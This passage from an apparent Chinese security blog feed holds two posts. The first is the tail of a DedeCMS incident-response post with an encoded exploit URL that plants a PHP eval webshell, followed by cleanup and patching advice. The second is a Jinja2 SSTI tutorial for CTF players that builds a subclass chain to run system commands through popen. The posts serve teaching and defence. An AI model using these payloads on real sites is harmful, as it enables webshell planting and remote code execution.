#`</p><p>（2）对应的EXP:</p><p><code>/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code></p><p>（3）执行EXP后，将向数据库表dede_myad中插入一条记录。</p><p>（4）进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><hr><p>如何清除？</p><p>1、删除网站目录中的webshell</p><p>2、清除dede_myad、dede_mytag数据库表中插入的SQL语句，防止再次被调用生成webshell。</p><p>如何防御？</p><p>网站采用开源CMS搭建，建议及时对官方发布的系统补丁以及内核版本进行升级。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>突突掉Python_jinjia2-&gt;SSTI</title>
      <link href="/posts/ff73a3f3.html"/>
      <url>/posts/ff73a3f3.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>SSTI（Server-Side Template Injection）服务端模板注入在CTF中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的payload，无法知晓其中的原理，促使我写了这篇文章来总结各种bypass SSTI的方法。</p><p>**本文涉及知识点实操练习-<a href="https://www.hetianlab.com/expc.do?w=exp_ass&amp;ec=ECID87ed-2223-40e5-8083-f5c55d69af28&amp;pk_campaign=csdn-wemedia">Flask服务端模板注入漏洞</a>:**通过该实验了解服务端模板注入漏洞的危害与利用。</p><p><strong>点击下方链接或操作哦</strong></p><p><a href="https://www.hetianlab.com/expc.do?w=exp_ass&amp;ec=ECID87ed-2223-40e5-8083-f5c55d69af28&amp;pk_campaign=csdn-wemedia">https://www.hetianlab.com/expc.do?w=exp_ass&amp;ec=ECID87ed-2223-40e5-8083-f5c55d69af28&amp;pk_campaign=csdn-wemedia</a></p><h3 id=""></h3><h3 id="基础知识">基础知识</h3><p>本篇文章从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p><h4 id="模板的基本语法">模板的基本语法</h4><p>官方文档对于模板的语法介绍如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; <span class="keyword">for</span> Statements</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; <span class="keyword">for</span> Expressions to <span class="built_in">print</span> to the template output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;# ... #&#125; <span class="keyword">for</span> Comments not included in the template output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  ... ## <span class="keyword">for</span> Line Statements</span><br></pre></td></tr></table></figure><p>这里我们逐条来看</p><ul><li><code>&#123;%%&#125;</code></li></ul><p>主要用来声明变量，也可以用于条件语句和循环语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set c= <span class="string">&#x27;kawhi&#x27;</span> %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">81</span>==<span class="number">9</span>*<span class="number">9</span> %&#125;kawhi&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> i in [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>] %&#125;kawhi&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><ul><li><code>&#123;&#123;&#125;&#125;</code></li></ul><p>用于将表达式打印到模板输出，比如我们一般在里面输入<code>2-1</code>，<code>2*2</code>，或者是字符串，调用对象的方法，都会渲染出结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">2</span><span class="number">-1</span>&#125;&#125; #输出<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125; #输出<span class="number">4</span></span><br></pre></td></tr></table></figure><p>我们通常会用<code>&#123;&#123;2*2&#125;&#125;</code>简单测试页面是否存在SSTI</p><ul><li>``</li></ul><p>表示未包含在模板输出中的注释</p><ul><li><code>##</code></li></ul><p>有和<code>&#123;%%&#125;</code>相同的效果</p><p>这里的模板注入主要用到的是<code>&#123;&#123;&#125;&#125;</code>和<code>&#123;%%&#125;</code></p><h4 id="常见的魔术方法">常见的魔术方法</h4><ul><li><code>__class__</code></li></ul><p>用于返回对象所属的类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;list&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><ul><li><code>__base__</code></li></ul><p>以字符串的形式返回一个类所继承的类</p><ul><li><code>__bases__</code></li></ul><p>以元组的形式返回一个类所继承的类</p><ul><li><code>__mro__</code></li></ul><p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; class Father():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...     def __init__(self):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...             pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; class GrandFather():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...     def __init__(self):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...             pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; class son(Father,GrandFather):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...     pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(son.__base__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(son.__bases__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(son.__mro__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><ul><li><code>__subclasses__()</code></li></ul><p>获取类的所有子类</p><ul><li><code>__init__</code></li></ul><p>所有自带带类都包含<code>init</code>方法，常用他当跳板来调用<code>globals</code></p><ul><li><code>__globals__</code></li></ul><p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</p><h4 id="漏洞成因与防御">漏洞成因与防御</h4><p>存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在SSTI的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">ssti.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;title&gt;SSTI&lt;/title&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>% (name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>我们简单输入一个<code>&#123;&#123;2-1&#125;&#125;</code>，返回了1，说明存在模板注入</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122752.png" alt="img"></p><p>而如果存在SSTI的话，我们就可以利用上面的魔术方法去构造可以读文件或者直接getshell的漏洞</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122797.png" alt="img"></p><p>如何拒绝这种漏洞呢，其实很简单只需要使用固定的模板即可，正确的代码应该如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti2.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122691.png" alt="img"></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122700.png" alt="img"></p><p>可以看到原封不动的输出了<code>&#123;&#123;2-1&#125;&#125;</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zUmh1VnlzRzlMZlAzbzlUaWJEZjFKQlhXUnFyMzJTdUhCS2hLSEE2NUpkQWliUE11NGUxaWF6VnNoY0hFYzdvUHBhOFpWalc5R2liTm5EQUVOaWJIYlRoRmljZy82NDA?x-oss-process=image/format,png" alt="img"></p><h3 id="构造链思路">构造链思路</h3><p>这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的<code>ssti.py</code>做实验</p><ul><li>第一步</li></ul><p>目的：使用<code>__class__</code>来获取内置类所对应的类</p><p>可以通过使用<code>str</code>，<code>list</code>，<code>tuple</code>，<code>dict</code>等来获取</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122646.png" alt="img"></p><ul><li>第二步</li></ul><p>目的：拿到<code>object</code>基类</p><p>用<code>__bases__[0]</code>拿到基类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>用<code>__base__</code>拿到基类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>用<code>__mro__[1]</code>或者<code>__mro__[-1]</code>拿到基类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><ul><li>第三步</li></ul><p>用<code>__subclasses__()</code>拿到子类列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure><ul><li>第四步</li></ul><p>在子类列表中找到可以getshell的类</p><h3 id="寻找利用类">寻找利用类</h3><p>在上述的第四步中，如何快速的寻找利用类呢</p><h4 id="利用脚本跑索引">利用脚本跑索引</h4><p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p><p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202406141122449.png" alt="img"></p><p>我们运行这个脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">λ python3 find.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;os._wrap_close&#x27;</span>&gt; <span class="number">128</span></span><br></pre></td></tr></table></figure><p>可以发现<code>object</code>基类的第128个子类名为<code>os._wrap_close</code>的这个类有popen方法</p><p>先调用它的<code>__init__</code>方法进行初始化类</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;function _wrap_close.__init__ at <span class="number">0x000001FCD0B21E58</span>&gt;</span><br></pre></td></tr></table></figure><p>再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>...中间省略...&lt;class <span class="string">&#x27;os.PathLike&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>然后就可以调用其中的popen来执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;desktop-t6u2ptl\\think\n&#x27;</span></span><br></pre></td></tr></table></figure><p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个<code>find.py</code>，这里用hhhm师傅的一个脚本直接去寻找子类</p><p>我们首先把所有的子类列举出来</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span 